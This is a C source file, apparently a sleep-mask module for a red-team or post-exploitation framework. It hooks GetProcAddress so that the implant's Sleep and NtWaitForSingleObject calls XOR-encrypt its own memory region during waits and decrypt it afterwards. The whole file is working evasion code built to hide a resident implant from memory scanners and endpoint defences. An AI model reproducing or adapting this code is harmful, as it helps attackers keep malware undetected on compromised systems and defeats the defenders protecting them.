#include <windows.h>
#include "../tcg.h"

WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect (LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

char SLEEPMASK_KEY[32] __attribute__((section(".text")));

void xor_region(MEMORY_BASIC_INFORMATION *meminfo) {
	// Change memory protections of the capability.
	DWORD oldProt = 0;
	KERNEL32$VirtualProtect(meminfo->AllocationBase, meminfo->RegionSize, PAGE_READWRITE, &oldProt);
	
	// Obfuscate or deobfuscate the capability.
	char *ptr = (char *) meminfo->AllocationBase;
	for(int i = 0; i < meminfo->RegionSize; i++) {
		ptr[i] = ptr[i] ^ SLEEPMASK_KEY[i % 32];
	}
	
	// Reprotect the capability.
	KERNEL32$VirtualProtect(meminfo->AllocationBase, meminfo->RegionSize, oldProt, &oldProt);
}

WINBASEAPI VOID WINAPI _Sleep(DWORD dwMilliseconds) {
	// Hook for KERNEL32$Sleep.
	
	void *caller = __builtin_return_address(0);
	
	MEMORY_BASIC_INFORMATION meminfo;
	KERNEL32$VirtualQuery(caller, &meminfo, sizeof(meminfo));
	xor_region(&meminfo);

	KERNEL32$Sleep(dwMilliseconds);
	
	xor_region(&meminfo);
}

WINBASEAPI NTSTATUS NTAPI _NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
	// Hook for NTDLL$NtWaitForSingleObject.

	void *caller = __builtin_return_address(0);
	
	MEMORY_BASIC_INFORMATION meminfo;
	KERNEL32$VirtualQuery(caller, &meminfo, sizeof(meminfo));
	xor_region(&meminfo);
	
	NTSTATUS status = NTDLL$NtWaitForSingleObject(Handle, Alertable, Timeout);
	
	xor_region(&meminfo);
	
	return status;
}

LPVOID WINAPI sleepmask(HMODULE hModule, LPCSTR lpProcName) {
	// A function that hooks GetProcAddress() to implement sleep masking.
	
	// lpProcName might be an ordinal, in which case we should leave it alone.
	if ((ULONG_PTR) lpProcName >> 16 == 0) {
		return KERNEL32$GetProcAddress(hModule, lpProcName);
	}
	
	// Use the __resolve_hook() intrinsic, which attempts to resolve lpProcName to a hooked function.
	LPVOID result = __resolve_hook( ror13hash( lpProcName ) );
	if (result != NULL) { return result; }
	
	// If that fails, fall back to the basic GetProcAddress().
	return KERNEL32$GetProcAddress(hModule, lpProcName);
}
